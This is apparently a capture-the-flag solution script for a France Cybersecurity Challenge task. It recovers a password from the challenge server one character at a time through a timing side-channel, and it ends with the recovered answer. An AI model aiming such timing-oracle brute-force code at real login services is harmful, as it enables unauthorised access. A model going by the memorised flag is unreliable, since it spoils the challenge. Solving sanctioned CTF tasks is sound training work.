import socket
import time

alpha = "!?$@_#*+=-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\x00"

def test_new_letter(sol, letter):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect(("challenges2.france-cybersecurity-challenge.fr", 6006))
	
	rep = sock.recv(4000)
	msg = rep
	while rep.find(b"mot de passe") == -1:
		rep = sock.recv(4000)
		msg += rep
	
	attempt = "".join(sol) + letter + '\n'

	t1 = time.time()
	sock.sendall(attempt.encode("utf-8"))
	sock.recv(4000)
	t2 = time.time()
	sock.close()

	print(l, t2-t1)
	if (t2-t1 > len(sol)+0.6):
		return True
	return False

sol = []

for i in range(100):
	for l in alpha:
		if l == '\x00':
			print("Error: no letter found after: " + "".join(sol))
			exit(1)
		if test_new_letter(sol, l):
			print(l, end="")
			sol.append(l)
			break

"""
sol = "T3mp#!" :)
"""